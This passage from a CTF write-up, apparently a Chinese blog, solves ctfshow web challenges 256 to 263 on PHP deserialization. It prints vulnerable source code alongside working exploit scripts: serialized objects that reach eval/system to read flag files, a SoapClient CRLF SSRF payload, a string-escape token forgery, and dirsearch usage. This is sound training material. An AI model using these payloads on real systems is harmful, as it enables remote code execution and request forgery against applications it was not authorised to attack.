src="https://img-blog.csdnimg.cn/2021041320415958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用在线工具进行的脚本编译！<br><img src="https://img-blog.csdnimg.cn/20210413205742514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>flag就有了！</p><hr /><h1 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username!==<span class="keyword">$this</span>-&gt;password)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>就只有这里改了代码，其它与上一题一样！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;&#125;</span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="keyword">new</span> ctfShowUser());</span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这样子就满足条件了！使得反序列化后满足条件了！<br><img src="https://img-blog.csdnimg.cn/20210413211254348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h1 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> info();<span class="comment">#new了个info类，无用</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;<span class="comment">#这里进行接受</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;<span class="comment">#这里进行判断</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);<span class="comment">#这里执行代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];<span class="comment">#从这里开始看</span></span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="comment">#俩个get变量</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;<span class="comment">#判断</span></span><br><span class="line">    <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);<span class="comment">#unserialize是对单一的已序列化的变量进行操作，将其转换回 PHP 的值。</span></span><br><span class="line">    <span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>);<span class="comment">#本地，即传到上面了！</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>__construct当对象被创建的时候自动调用，对对象进行初始化。当所有的操作执行完毕之后，需要释放序列化的对象，触发__destruct()魔术方法</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&quot;system(&#x27;cat f*&#x27;);&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="keyword">new</span> ctfShowUser());</span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里将backDoor类的code改成我们想要执行的的代码！<br><img src="https://img-blog.csdnimg.cn/20210413213406784.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>简单脚本如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;backDoor&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;system(&quot;tac flag.php&quot;);&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> ctfShowUser));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>相对简化了好多！<br>对了，这里是不能用cat这个的！</p><hr /><h1 id="web258-加号绕过正则：-oc-d-i"><a href="#web258-加号绕过正则：-oc-d-i" class="headerlink" title="web258(加号绕过正则： /[oc]:\d+:/i)"></a>web258(加号绕过正则： /[oc]:\d+:/i)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开始构造代码！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;system(&quot;cat f*&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure><p>改了private为public<br><img src="https://img-blog.csdnimg.cn/20210417151331577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h1 id="web259-SoapClient与CRLF组合拳-未做完"><a href="#web259-SoapClient与CRLF组合拳-未做完" class="headerlink" title="web259(SoapClient与CRLF组合拳)(未做完)"></a>web259(SoapClient与CRLF组合拳)(未做完)</h1><p>这里还是比较难的！看着大师傅的wp做做！</p><blockquote><p>CRLF是“回车+换行”（\r\n）的简称，其十六进制编码分别为0x0d和0x0a。在HTTP协议中，HTTP header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码。CRLF漏洞常出现在Location与Set-cookie消息头中。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$vip</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;getFlag();</span><br></pre></td></tr></table></figure><p>利用php原生类SoapClient，构造如下！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SoapClient :: SoapClient  (mixed <span class="variable">$wsdl</span> [, <span class="keyword">array</span> <span class="variable">$options</span>])</span><br></pre></td></tr></table></figure><p>WSDL（网络服务描述语言，Web Services Description Language）是一门基于 XML 的语言，用于描述 Web Services 以及如何对它们进行访问。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;token=ctfshow&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded&#x27;</span>.<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)strlen(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,<span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;ssrf&quot;</span>));</span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$a</span> = str_replace(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><hr /><h1 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,serialize(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的意思是说这要我们传入的get包含ctfshow_i_love_36D就可以了！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctfshow&#x3D;s:18:&quot;ctfshow_i_love_36D&quot;;</span><br></pre></td></tr></table></figure><hr /><h1 id="web261-未做"><a href="#web261-未做" class="headerlink" title="web261(未做)"></a>web261(未做)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$vip</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;getFlag();</span><br></pre></td></tr></table></figure><hr /><h1 id="web262-反序列化字符串逃逸"><a href="#web262-反序列化字符串逃逸" class="headerlink" title="web262(反序列化字符串逃逸)"></a>web262(反序列化字符串逃逸)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> message(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, serialize(<span class="variable">$msg</span>));</span><br><span class="line">    setcookie(<span class="string">&#x27;msg&#x27;</span>,base64_encode(<span class="variable">$umsg</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>直接就可以弄了！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$from</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$msg</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$to</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> message();</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = base64_encode(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210417154853713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>另一种做法！payload如下！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$f</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$m</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$t</span> = <span class="string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> message(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line"><span class="variable">$umsg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, serialize(<span class="variable">$msg</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$umsg</span> ;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$umsg</span>);</span><br></pre></td></tr></table></figure><hr /><h1 id="web263-session反序列化"><a href="#web263-session反序列化" class="headerlink" title="web263(session反序列化)"></a>web263(session反序列化)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>这里是dirsearch脚本，下面是使用方法！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u <span class="string">&quot;网站域名&quot;</span> -e * -t <span class="number">20</span> -x <span class="number">301</span>,<span class="number">403</span>,<span class="number">404</span>,<span class="number">500</span>,<span class="number">501</span></span><br><span class="line"><span class="comment">#对目标所有文件进行扫描，扫描线程数为20，返回结果过滤301,403,404,500,501状态码</span></span><br><span class="line">-h 查看帮助</span><br><span class="line">-u URL 设置url</span><br><span class="line">-L 设置url列表</span><br><span class="line">-e 网站脚本类型，后跟php,asp,aspx等已知类型，不清楚写*</span><br><span class="line">-s 时间，设置请求之间的延时</span><br><span class="line">-r 递归地扫描</span><br><span class="line">-t 线程数，设置扫描线程</span><br><span class="line">-x 要排除状态码，返回结果时排除显示哪些状态码</span><br><span class="line">-w 设置字典</span><br><span class="line">-H 设置请求头</span><br><span class="line">-c COOKIE，设置COOKIE</span><br></pre></td></tr></table></figure><p>当然御剑扫描也是可以的！<br>发现三个文件index.php和flag.php和check.php还有<a href="http://www.rar和www.zip.说明源码泄露了!/">www.rar和www.zip。说明源码泄露了！</a><br>check.php代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td 